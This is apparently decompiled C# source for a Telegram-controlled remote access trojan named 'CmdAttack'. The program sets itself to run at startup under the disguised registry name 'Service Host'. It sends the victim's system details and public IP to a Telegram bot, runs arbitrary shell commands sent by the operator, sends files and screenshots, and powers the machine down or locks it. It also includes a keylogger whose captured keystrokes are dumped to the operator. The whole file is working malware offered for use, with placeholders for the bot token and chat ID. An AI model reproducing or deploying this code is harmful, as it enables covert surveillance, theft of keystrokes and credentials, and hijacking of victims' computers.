using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Telegram;

namespace CmdAttack
{
	// Token: 0x02000005 RID: 5
	public partial class Core : Form
	{
		// Token: 0x06000009 RID: 9 RVA: 0x00002114 File Offset: 0x00000314
		public Core()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600000A RID: 10
		[DllImport("user32.dll")]
		public static extern void LockWorkStation();

		// Token: 0x0600000B RID: 11
		[DllImport("winmm")]
		private static extern long timeGetTime();

		// Token: 0x0600000C RID: 12
		[DllImport("user32")]
		private static extern int GetAsyncKeyState(long vkey);

		// Token: 0x0600000D RID: 13 RVA: 0x0000216E File Offset: 0x0000036E
		private void get_new_ip()
		{
			this.publicIp = new WebClient().DownloadString("http://icanhazip.com");
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002188 File Offset: 0x00000388
		private void Core_Load(object sender, EventArgs e)
		{
			try
			{
				this.publicIp = new WebClient().DownloadString("http://icanhazip.com");
			}
			catch (Exception)
			{
				this.SendText("Not Download Public ip ...");
			}
			string text = Core.timeGetTime().ToString();
			this.Ks = "U_" + text.ToString();
			this.GetData();
			bot.token = "token";
			// put your token
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
				registryKey.SetValue("Service Host", "\"" + Application.ExecutablePath.ToString() + "\"");
			}
			catch (Exception)
			{
				this.SendText("Problems in making your startup task");
			}
			try
			{
				Control.CheckForIllegalCrossThreadCalls = false;
				this.backgroundWorker.RunWorkerAsync();
			}
			catch (Exception)
			{
				MessageBox.Show("Eroor For Start App ", "Eroor For Start", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600000F RID: 15 RVA: 0x0000229C File Offset: 0x0000049C
		private void ScreenShut()
		{
			try
			{
				Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
				Graphics graphics = Graphics.FromImage(bitmap);
				graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
				bitmap.Save("Screenshot.png", ImageFormat.Png);
				using (FileStream fileStream = new FileStream("Screenshot.png", FileMode.Open, FileAccess.Read, FileShare.Read))
				{
					FileToSend fileToSend = new FileToSend("Screenshot.png", fileStream);
					bot.SendPhoto.send(bot.chat_id, "Screenshot.png");
				}
			}
			catch (Exception)
			{
				bot.sendMessage.send(bot.chat_id, "Eroor For Screenshot");
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000023A4 File Offset: 0x000005A4
		private void GetData()
		{
			try
			{
				string a = Environment.OSVersion.Version.Major.ToString() + "." + Environment.OSVersion.Version.Minor.ToString();
				bool flag = a == "5.0";
				string text;
				if (flag)
				{
					text = "Windows 2000";
				}
				else
				{
					bool flag2 = a == "5.1";
					if (flag2)
					{
						text = "Windows XP";
					}
					else
					{
						bool flag3 = a == "5.2";
						if (flag3)
						{
							text = "Windows XP 64-Bit Edition";
						}
						else
						{
							bool flag4 = a == "6.0";
							if (flag4)
							{
								text = "Windows Vista";
							}
							else
							{
								bool flag5 = a == "6.1";
								if (flag5)
								{
									text = "Windows 7";
								}
								else
								{
									bool flag6 = a == "6.2";
									if (flag6)
									{
										text = "Windows 8 Or Higher";
									}
									else
									{
										text = "Dont Found!";
									}
								}
							}
						}
					}
				}
				string text2 = string.Concat(new object[]
				{
					"New Server Run App \n=====================================\nUser System Ip : ",
					this.publicIp,
					"\nUser Name Run App : ",
					Environment.UserName,
					"\nDirectory App : ",
					Environment.CommandLine,
					"\nSystem Time : ",
					DateTime.Now,
					"\nCpu Count : ",
					Environment.ProcessorCount,
					"\nOs Version : ",
					Environment.OSVersion,
					"\nWindows Version : ",
					text,
					"\nSystem Up Time  : ",
					Core.timeGetTime().ToString(),
                    "\nProgramer : nKey Start Control : /",
					this.Ks
				});
				Debug.WriteLine(this.Ks);
				this.SendText(text2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x0000258C File Offset: 0x0000078C
		private void SendText(string Text)
		{
			string text = "ID";
			// PUT YOUR ID you can get your id From @userinfobot
			string str = "token";
			// put your token bot
			WebClient webClient = new WebClient();
			webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
			Encoding uTF = Encoding.UTF8;
			byte[] bytes = uTF.GetBytes(string.Concat(new string[]
			{
				"&chat_id=",
				text,
				"&text=",
				Text,
				"&parse_mode=html"
			}));
			string address = "https://api.telegram.org/bot" + str + "/sendMessage";
			try
			{
				byte[] bytes2 = webClient.UploadData(address, "POST", bytes);
				string @string = Encoding.UTF8.GetString(bytes2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002650 File Offset: 0x00000850
		private void backgroundWorker_DoWork(object sender, DoWorkEventArgs e)
		{
			string hostName = Dns.GetHostName();
			string text = Dns.GetHostByName(hostName).AddressList[0].ToString();
			while (true)
			{
				bot.update = "True";
				bool flag = bot.message_text == "/" + this.Ks;
				if (flag)
				{
					this.get_new_ip();
					bot.sendMessage.send(bot.chat_id, string.Concat(new string[]
					{
						"System Connected\n User Name :",
						SystemInformation.UserName,
						"\nLocal  Ip System :",
						text,
						"\nInternet Ip For Remote : ",
						this.publicIp
					}));
					bot.sendKeyboard.keyboard_R8_1 = this.Ks + ":⚙Task Manager⚙";
					bot.sendKeyboard.keyboard_R7_1 = this.Ks + ":\ud83d\udcacCommand Attack\ud83d\udcac";
					bot.sendKeyboard.keyboard_R6_1 = this.Ks + ":⚡SystemPower⚡";
					bot.sendKeyboard.keyboard_R5_1 = this.Ks + ":☣KeyLoger☣";
					bot.sendKeyboard.keyboard_R4_1 = this.Ks + ":\ud83d\udd12Lock screen\ud83d\udd11";
					bot.sendKeyboard.keyboard_R3_1 = this.Ks + ":\ud83d\udcf7screen shot\ud83d\udcf8";
					bot.sendKeyboard.keyboard_R2_1 = this.Ks + ":\ud83d\udcbbSystemInfo\ud83d\udcbb";
					bot.sendKeyboard.keyboard_R2_2 = this.Ks + ":\ud83d\udcc3Download File\ud83d\udcc3";
					bot.sendKeyboard.keyboard_R1_1 = this.Ks + ":\ud83d\udee0PPS Settings\ud83d\udee0";
					bot.sendKeyboard.keyboard_R1_2 = this.Ks + ":\ud83d\udcccShutdown App\ud83d\udccc";
					bot.sendKeyboard.send(bot.chat_id, "Welcome To Vps Manager\n Programer : HammerCracker\nvisit : @HammerCracker");
				}
				bool flag2 = bot.message_text == this.Ks + ":\ud83d\udcc3Download File\ud83d\udcc3";
				if (flag2)
				{
					bot.sendMessage.send(bot.chat_id, "Download File : " + this.Ks + ":Download: Link File ");
				}
				bool flag3 = bot.message_text.Contains(this.Ks + ":Download:");
				if (flag3)
				{
					bot.SendFile.send(bot.chat_id, bot.message_text.Replace(this.Ks + ":Download:", ""));
				}
				bool flag4 = bot.message_text == this.Ks + ":\ud83d\udcccShutdown App\ud83d\udccc";
				if (flag4)
				{
					bot.sendMessage.send(bot.chat_id, "Shutdown App ...");
					Thread.Sleep(500);
					bot.sendMessage.send(bot.chat_id, "1");
					Thread.Sleep(500);
					bot.sendMessage.send(bot.chat_id, "2");
					Thread.Sleep(500);
					bot.sendMessage.send(bot.chat_id, "3");
					bot.sendMessage.send(bot.chat_id, "Application Shutdown");
					base.Close();
					Application.Exit();
				}
				bool flag5 = bot.message_text == this.Ks + ":\ud83d\udee0PPS Settings\ud83d\udee0";
				if (flag5)
				{
					bot.send_inline_keyboard.keyboard_R1_1 = "High";
					bot.send_inline_keyboard.keyboard_R1_1_callback_data = this.Ks + ":high";
					bot.send_inline_keyboard.keyboard_R2_1 = "Medium";
					bot.send_inline_keyboard.keyboard_R2_1_callback_data = this.Ks + ":medium";
					bot.send_inline_keyboard.keyboard_R3_1 = "Low";
					bot.send_inline_keyboard.keyboard_R3_1_callback_data = this.Ks + ":low";
					bot.send_inline_keyboard.send(bot.chat_id, "\ud83d\udee0 PPS Settings For App NL Brute \ud83d\udee0");
				}
				bool flag6 = bot.data == this.Ks + ":high";
				if (flag6)
				{
					try
					{
						Process[] processes = Process.GetProcesses();
						for (int i = 0; i < processes.Length; i++)
						{
							Process process = processes[i];
							bool flag7 = process.ProcessName.ToLower() == "nlbrute";
							bool flag8 = flag7;
							if (flag8)
							{
								process.PriorityClass = ProcessPriorityClass.High;
								bot.sendMessage.send(bot.chat_id, "System PPs = High");
							}
						}
					}
					catch (Exception)
					{
						bot.sendMessage.send(bot.chat_id, "Eroor PPS Settings");
					}
				}
				bool flag9 = bot.data == this.Ks + ":medium";
				if (flag9)
				{
					try
					{
						Process[] processes2 = Process.GetProcesses();
						for (int j = 0; j < processes2.Length; j++)
						{
							Process process2 = processes2[j];
							bool flag10 = process2.ProcessName.ToLower() == "nlbrute";
							bool flag11 = flag10;
							if (flag11)
							{
								process2.PriorityClass = ProcessPriorityClass.Normal;
								bot.sendMessage.send(bot.chat_id, "System PPs = Medium");
							}
						}
					}
					catch (Exception)
					{
						bot.sendMessage.send(bot.chat_id, "Eroor PPS Settings");
					}
				}
				bool flag12 = bot.data == this.Ks + ":low";
				if (flag12)
				{
					try
					{
						Process[] processes3 = Process.GetProcesses();
						for (int k = 0; k < processes3.Length; k++)
						{
							Process process3 = processes3[k];
							bool flag13 = process3.ProcessName.ToLower() == "nlbrute";
							bool flag14 = flag13;
							if (flag14)
							{
								process3.PriorityClass = ProcessPriorityClass.BelowNormal;
								bot.sendMessage.send(bot.chat_id, "System PPs = Low");
							}
						}
					}
					catch (Exception)
					{
						bot.sendMessage.send(bot.chat_id, "Eroor PPS Settings");
					}
				}
				bool flag15 = bot.message_text == this.Ks + ":\ud83d\udcacCommand Attack\ud83d\udcac";
				if (flag15)
				{
					try
					{
						bot.sendMessage.send(bot.chat_id, "Send Yor Command\nExample :>>" + this.Ks + ":Ipconfig");
					}
					catch (Exception)
					{
						bot.sendMessage.send(bot.chat_id, "Eroor For Command Attack");
					}
				}
				bool flag16 = bot.message_text == this.Ks + ":⚙Task Manager⚙";
				if (flag16)
				{
					try
					{
						float num = this.CpuUsage.NextValue();
						float num2 = this.RamUsage.NextValue();
						string text2 = "";
						this.ListProcess.Items.Clear();
						Process[] processes4 = Process.GetProcesses();
						for (int l = 0; l < processes4.Length; l++)
						{
							Process process4 = processes4[l];
							this.ListProcess.Items.Add(process4.ProcessName);
						}
						for (int m = 0; m < this.ListProcess.Items.Count; m++)
						{
							text2 = text2 + "\n" + this.ListProcess.Items[m].ToString();
						}
						bot.sendMessage.send(bot.chat_id, string.Concat(new object[]
						{
							"Processor Count : ",
							Environment.ProcessorCount,
							"\n<<<========================>>>\nProcessor Usage : ",
							string.Format("{0:0.00}%", num),
							"\n<<<========================>>>\nRam Usage (MB) : ",
							Convert.ToInt32(this.ram.NextValue()),
							" Mb\n<<<========================>>>\nRam Usage (%) :",
							string.Format("{0:0.00}%", num2),
							"\n<<<========================>>>\nAll App Opened : ",
							this.ListProcess.Items.Count.ToString(),
							"\n<<<========================>>>\n+{==========<<<List App>>>==========}+\n",
							text2,
							"\n+{==========<<<End List>>>==========}+"
						}));
					}
					catch (Exception)
					{
						bot.sendMessage.send(bot.chat_id, "Eroor For Task Manager");
					}
				}
				bool flag17 = bot.message_text == this.Ks + ":⚡SystemPower⚡";
				if (flag17)
				{
					bot.send_inline_keyboard.keyboard_R2_1 = "Shutdown";
					bot.send_inline_keyboard.keyboard_R2_1_callback_data = this.Ks + ":sysshut";
					bot.send_inline_keyboard.keyboard_R3_1 = "Restart";
					bot.send_inline_keyboard.keyboard_R3_1_callback_data = this.Ks + ":sysreset";
					bot.send_inline_keyboard.keyboard_R4_1 = "Windows Lock";
					bot.send_inline_keyboard.keyboard_R4_1_callback_data = this.Ks + ":winlock";
					bot.send_inline_keyboard.keyboard_R3_2 = "windows Hibernate";
					bot.send_inline_keyboard.keyboard_R3_2_callback_data = this.Ks + ":syshiber";
					bot.send_inline_keyboard.keyboard_R4_2 = "windows Stand By";
					bot.send_inline_keyboard.keyboard_R4_2_callback_data = this.Ks + ":Sysstand";
					bot.send_inline_keyboard.send(bot.chat_id, "\ud83d\udd0b System  Power Manager \ud83d\udd0b");
				}
				else
				{
					bool flag18 = bot.data == this.Ks + ":sysshut";
					if (flag18)
					{
						try
						{
							bot.sendMessage.send(bot.chat_id, "Shutdown System");
							Process.Start("ShutDown", "/s");
						}
						catch (Exception)
						{
							bot.sendMessage.send(bot.chat_id, "Not Shutdown System");
						}
					}
					else
					{
						bool flag19 = bot.data == this.Ks + ":sysreset";
						if (flag19)
						{
							try
							{
								bot.sendMessage.send(bot.chat_id, "Reset System");
								Process.Start("ShutDown", "/r");
							}
							catch (Exception)
							{
								bot.sendMessage.send(bot.chat_id, "Not Reset System");
							}
						}
						else
						{
							bool flag20 = bot.data == this.Ks + ":winlock";
							if (flag20)
							{
								try
								{
									bot.sendMessage.send(bot.chat_id, "Lock System");
									Core.LockWorkStation();
								}
								catch (Exception)
								{
									bot.sendMessage.send(bot.chat_id, "Not Lock System");
								}
							}
							else
							{
								bool flag21 = bot.data == this.Ks + ":syshiber";
								if (flag21)
								{
									try
									{
										Application.SetSuspendState(PowerState.Hibernate, true, true);
									}
									catch (Exception)
									{
										bot.sendMessage.send(bot.chat_id, "Eroor For Hibernate System");
									}
								}
								else
								{
									bool flag22 = bot.data == this.Ks + ":Sysstand";
									if (flag22)
									{
										try
										{
											Application.SetSuspendState(PowerState.Suspend, true, true);
										}
										catch (Exception)
										{
											bot.sendMessage.send(bot.chat_id, "Eroor For Sleep System");
										}
									}
								}
							}
						}
					}
				}
				bool flag23 = bot.message_text == this.Ks + ":☣KeyLoger☣";
				if (flag23)
				{
					bot.send_inline_keyboard.keyboard_R1_1 = "Dump KeyLoger";
					bot.send_inline_keyboard.keyboard_R1_1_callback_data = this.Ks + ":DumpKy";
					bot.send_inline_keyboard.keyboard_R1_2 = "Clear KeyLoger";
					bot.send_inline_keyboard.keyboard_R1_2_callback_data = this.Ks + ":KeyCls";
					bot.send_inline_keyboard.send(bot.chat_id, "☣KeyLoger☣");
				}
				bool flag24 = bot.data == this.Ks + ":DumpKy";
				if (flag24)
				{
					try
					{
						bool flag25 = this.KeyLogerText.Text == "";
						if (flag25)
						{
							bot.sendMessage.send(bot.chat_id, "Dump To : " + DateTime.Now + "\n User Key : Null");
						}
						else
						{
							bot.sendMessage.send(bot.chat_id, string.Concat(new object[]
							{
								"Dump To : ",
								DateTime.Now,
								"\n User Key : \n",
								this.KeyLogerText.Text
							}));
						}
					}
					catch (Exception)
					{
						bot.sendMessage.send(bot.chat_id, "Eroor For Dump KeyLoger");
					}
				}
				bool flag26 = bot.data == this.Ks + ":KeyCls";
				if (flag26)
				{
					try
					{
						this.KeyLogerText.Text = "";
						bot.send_inline_keyboard.send(bot.chat_id, "☣KeyLoger Clear☣");
					}
					catch (Exception)
					{
						bot.sendMessage.send(bot.chat_id, "Eroor For Clear KeyLoger");
					}
				}
				bool flag27 = bot.message_text == this.Ks + ":\ud83d\udcbbSystemInfo\ud83d\udcbb";
				if (flag27)
				{
					this.get_new_ip();
					try
					{
						bot.sendMessage.send(bot.chat_id, string.Concat(new object[]
						{
							"<<<<====================>>>>\nPwd :",
							Environment.CommandLine.ToString(),
							"\n<<<<====================>>>>\nLocal  Ip System :",
							text,
							"\nInternet Ip For Remote : ",
							this.publicIp,
							"<<<<====================>>>>\nUp Time System (S) : ",
							Core.timeGetTime().ToString(),
							"\n<<<<====================>>>>\nOSVersion :",
							Environment.OSVersion.ToString(),
							"\n<<<<====================>>>>\nSystem User Name : ",
							SystemInformation.UserName,
							"\n<<<<====================>>>>\nCpu Core :",
							Environment.ProcessorCount,
							"\n<<<<====================>>>>"
						}));
					}
					catch (Exception)
					{
						bot.sendMessage.send(bot.chat_id, "Eroor For Send System Info");
					}
				}
				bool flag28 = bot.message_text == this.Ks + ":\ud83d\udd12Lock screen\ud83d\udd11";
				if (flag28)
				{
					try
					{
						bot.sendMessage.send(bot.chat_id, "Lock System");
						Core.LockWorkStation();
					}
					catch (Exception)
					{
						bot.sendMessage.send(bot.chat_id, "Not Lock System");
					}
				}
				bool flag29 = bot.message_text == this.Ks + ":\ud83d\udcf7screen shot\ud83d\udcf8";
				if (flag29)
				{
					try
					{
						bool flag30 = File.Exists("Screenshot.png");
						if (flag30)
						{
							try
							{
								File.Delete("Screenshot.png");
								this.ScreenShut();
							}
							catch (Exception)
							{
								bot.sendMessage.send(bot.chat_id, "Trouble deleting previous image");
							}
						}
						else
						{
							this.ScreenShut();
						}
					}
					catch (Exception)
					{
						bot.sendMessage.send(bot.chat_id, "Eroor For screen shot");
					}
				}
				bool flag31 = bot.message_text == "Send Yor Command Line" || bot.message_text == this.Ks + ":⚙Task Manager⚙" || bot.message_text == this.Ks + ":\ud83d\udcacCommand Attack\ud83d\udcac" || bot.message_text == this.Ks + ":⚡SystemPower⚡" || bot.message_text == this.Ks + ":☣KeyLoger☣" || bot.message_text == this.Ks + ":\ud83d\udd12Lock screen\ud83d\udd11" || bot.message_text == this.Ks + ":\ud83d\udcf7screen shot\ud83d\udcf8" || bot.message_text == this.Ks + ":\ud83d\udcbbSystemInfo\ud83d\udcbb" || bot.message_text == this.Ks + ":\ud83d\udee0PPS Settings\ud83d\udee0" || bot.message_text == this.Ks + ":\ud83d\udcccShutdown App\ud83d\udccc" || bot.message_text == this.Ks + ":\ud83d\udcc3Download File\ud83d\udcc3" || bot.message_text.Contains(this.Ks + ":Download:");
				if (!flag31)
				{
					this.Command(bot.message_text);
				}
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00003680 File Offset: 0x00001880
		private void Command(string Line)
		{
			try
			{
				bool flag = Line.Contains(this.Ks + ":");
				bool flag2 = flag;
				if (flag2)
				{
					bool flag3 = Line == this.Ks + ":Time" || Line == this.Ks + ":time" || Line == this.Ks + ":netstat -a";
					if (flag3)
					{
						bot.sendMessage.send(bot.chat_id, "Eroor For Send Command");
					}
					else
					{
						Process process = Process.Start(new ProcessStartInfo("cmd")
						{
							RedirectStandardInput = true,
							RedirectStandardOutput = true,
							UseShellExecute = false,
							CreateNoWindow = true
						});
						process.StandardInput.WriteLine(Line.Replace(this.Ks + ":", " "));
						process.StandardInput.WriteLine("exit");
						bot.sendMessage.send(bot.chat_id, process.StandardOutput.ReadToEnd());
					}
				}
			}
			catch (Exception)
			{
				bot.sendMessage.send(bot.chat_id, "Eroor For Send Command");
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000037DC File Offset: 0x000019DC
		private void SendToServer(string Commend)
		{
			try
			{
				this.KeyLogerText.Text = this.KeyLogerText.Text + Commend;
			}
			catch (Exception)
			{
				bot.sendMessage.send(bot.chat_id, "Eroor For KeyLoger");
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00003830 File Offset: 0x00001A30
		private void timer_Tick(object sender, EventArgs e)
		{
			try
			{
				for (long num = 1L; num <= 255L; num += 1L)
				{
					int asyncKeyState = Core.GetAsyncKeyState(num);
					bool flag = asyncKeyState != 0 & num != 255L;
					if (flag)
					{
						bool flag2 = num.ToString() == "32";
						if (flag2)
						{
							this.SendToServer(" ");
						}
						bool flag3 = num.ToString() == "81";
						if (flag3)
						{
							this.SendToServer("Q");
						}
						bool flag4 = num.ToString() == "87";
						if (flag4)
						{
							this.SendToServer("W");
						}
						bool flag5 = num.ToString() == "69";
						if (flag5)
						{
							this.SendToServer("E");
						}
						bool flag6 = num.ToString() == "82";
						if (flag6)
						{
							this.SendToServer("R");
						}
						bool flag7 = num.ToString() == "84";
						if (flag7)
						{
							this.SendToServer("T");
						}
						bool flag8 = num.ToString() == "89";
						if (flag8)
						{
							this.SendToServer("Y");
						}
						bool flag9 = num.ToString() == "85";
						if (flag9)
						{
							this.SendToServer("U");
						}
						bool flag10 = num.ToString() == "73";
						if (flag10)
						{
							this.SendToServer("I");
						}
						bool flag11 = num.ToString() == "79";
						if (flag11)
						{
							this.SendToServer("O");
						}
						bool flag12 = num.ToString() == "80";
						if (flag12)
						{
							this.SendToServer("P");
						}
						bool flag13 = num.ToString() == "65";
						if (flag13)
						{
							this.SendToServer("A");
						}
						bool flag14 = num.ToString() == "83";
						if (flag14)
						{
							this.SendToServer("S");
						}
						bool flag15 = num.ToString() == "68";
						if (flag15)
						{
							this.SendToServer("D");
						}
						bool flag16 = num.ToString() == "70";
						if (flag16)
						{
							this.SendToServer("F");
						}
						bool flag17 = num.ToString() == "71";
						if (flag17)
						{
							this.SendToServer("G");
						}
						bool flag18 = num.ToString() == "72";
						if (flag18)
						{
							this.SendToServer("H");
						}
						bool flag19 = num.ToString() == "74";
						if (flag19)
						{
							this.SendToServer("J");
						}
						bool flag20 = num.ToString() == "75";
						if (flag20)
						{
							this.SendToServer("K");
						}
						bool flag21 = num.ToString() == "76";
						if (flag21)
						{
							this.SendToServer("L");
						}
						bool flag22 = num.ToString() == "90";
						if (flag22)
						{
							this.SendToServer("Z");
						}
						bool flag23 = num.ToString() == "88";
						if (flag23)
						{
							this.SendToServer("X");
						}
						bool flag24 = num.ToString() == "67";
						if (flag24)
						{
							this.SendToServer("C");
						}
						bool flag25 = num.ToString() == "86";
						if (flag25)
						{
							this.SendToServer("V");
						}
						bool flag26 = num.ToString() == "66";
						if (flag26)
						{
							this.SendToServer("B");
						}
						bool flag27 = num.ToString() == "78";
						if (flag27)
						{
							this.SendToServer("N");
						}
						bool flag28 = num.ToString() == "77";
						if (flag28)
						{
							this.SendToServer("M");
						}
						bool flag29 = num.ToString() == "96";
						if (flag29)
						{
							this.SendToServer("0");
						}
						bool flag30 = num.ToString() == "97";
						if (flag30)
						{
							this.SendToServer("1");
						}
						bool flag31 = num.ToString() == "98";
						if (flag31)
						{
							this.SendToServer("2");
						}
						bool flag32 = num.ToString() == "99";
						if (flag32)
						{
							this.SendToServer("3");
						}
						bool flag33 = num.ToString() == "100";
						if (flag33)
						{
							this.SendToServer("4");
						}
						bool flag34 = num.ToString() == "101";
						if (flag34)
						{
							this.SendToServer("5");
						}
						bool flag35 = num.ToString() == "102";
						if (flag35)
						{
							this.SendToServer("6");
						}
						bool flag36 = num.ToString() == "103";
						if (flag36)
						{
							this.SendToServer("7");
						}
						bool flag37 = num.ToString() == "104";
						if (flag37)
						{
							this.SendToServer("8");
						}
						bool flag38 = num.ToString() == "105";
						if (flag38)
						{
							this.SendToServer("9");
						}
						bool flag39 = num.ToString() == "219";
						if (flag39)
						{
							this.SendToServer("[");
						}
						bool flag40 = num.ToString() == "221";
						if (flag40)
						{
							this.SendToServer("]");
						}
						bool flag41 = num.ToString() == "186";
						if (flag41)
						{
							this.SendToServer(";");
						}
						bool flag42 = num.ToString() == "222";
						if (flag42)
						{
							this.SendToServer("'");
						}
						bool flag43 = num.ToString() == "220";
						if (flag43)
						{
							this.SendToServer("\\");
						}
						bool flag44 = num.ToString() == "188";
						if (flag44)
						{
							this.SendToServer(",");
						}
						bool flag45 = num.ToString() == "190" || num.ToString() == "110";
						if (flag45)
						{
							this.SendToServer(".");
						}
						bool flag46 = num.ToString() == "191";
						if (flag46)
						{
							this.SendToServer("/");
						}
						bool flag47 = num.ToString() == "91";
						if (flag47)
						{
							this.SendToServer("(+Windows+)");
						}
						bool flag48 = num.ToString() == "38";
						if (flag48)
						{
							this.SendToServer("▲");
						}
						bool flag49 = num.ToString() == "40";
						if (flag49)
						{
							this.SendToServer("▼");
						}
						bool flag50 = num.ToString() == "39";
						if (flag50)
						{
							this.SendToServer("▼");
						}
						bool flag51 = num.ToString() == "37";
						if (flag51)
						{
							this.SendToServer("◄");
						}
						bool flag52 = num.ToString() == "8";
						if (flag52)
						{
						}
						bool flag53 = num.ToString() == "20";
						if (flag53)
						{
							this.SendToServer("(+CapsLock+)");
						}
						bool flag54 = num.ToString() == "9";
						if (flag54)
						{
							this.SendToServer("(+Tab+)");
						}
						bool flag55 = num.ToString() == "27";
						if (flag55)
						{
							this.SendToServer("(+Esc+)");
						}
						bool flag56 = num.ToString() == "173";
						if (flag56)
						{
							this.SendToServer("(+F1+)");
						}
						bool flag57 = num.ToString() == "174";
						if (flag57)
						{
							this.SendToServer("(+F2+)");
						}
						bool flag58 = num.ToString() == "175";
						if (flag58)
						{
							this.SendToServer("(+F3+)");
						}
						bool flag59 = num.ToString() == "6591";
						if (flag59)
						{
							this.SendToServer("(+F7+)");
						}
						bool flag60 = num.ToString() == "7691";
						if (flag60)
						{
							this.SendToServer("(+F9+)");
						}
						bool flag61 = num.ToString() == "8091";
						if (flag61)
						{
							this.SendToServer("(+F10+)");
						}
						bool flag62 = num.ToString() == "49";
						if (flag62)
						{
							this.SendToServer("1");
						}
						bool flag63 = num.ToString() == "50";
						if (flag63)
						{
							this.SendToServer("2");
						}
						bool flag64 = num.ToString() == "51";
						if (flag64)
						{
							this.SendToServer("3");
						}
						bool flag65 = num.ToString() == "52";
						if (flag65)
						{
							this.SendToServer("4");
						}
						bool flag66 = num.ToString() == "53";
						if (flag66)
						{
							this.SendToServer("5");
						}
						bool flag67 = num.ToString() == "54";
						if (flag67)
						{
							this.SendToServer("6");
						}
						bool flag68 = num.ToString() == "55";
						if (flag68)
						{
							this.SendToServer("7");
						}
						bool flag69 = num.ToString() == "56";
						if (flag69)
						{
							this.SendToServer("8");
						}
						bool flag70 = num.ToString() == "57";
						if (flag70)
						{
							this.SendToServer("9");
						}
						bool flag71 = num.ToString() == "48";
						if (flag71)
						{
							this.SendToServer("0");
						}
					}
				}
			}
			catch (Exception)
			{
				bot.sendMessage.send(bot.chat_id, "Eroor For KeyLoger");
			}
		}

		// Token: 0x04000006 RID: 6
		private string Ks;

		// Token: 0x04000007 RID: 7
		private string publicIp = "";

		// Token: 0x04000008 RID: 8
		private TextBox KeyLogerText = new TextBox();

		// Token: 0x04000009 RID: 9
		private ListBox ListProcess = new ListBox();

		// Token: 0x0400000A RID: 10
		public PerformanceCounter ram = new PerformanceCounter("Memory", "Available MBytes", true);
	}
}
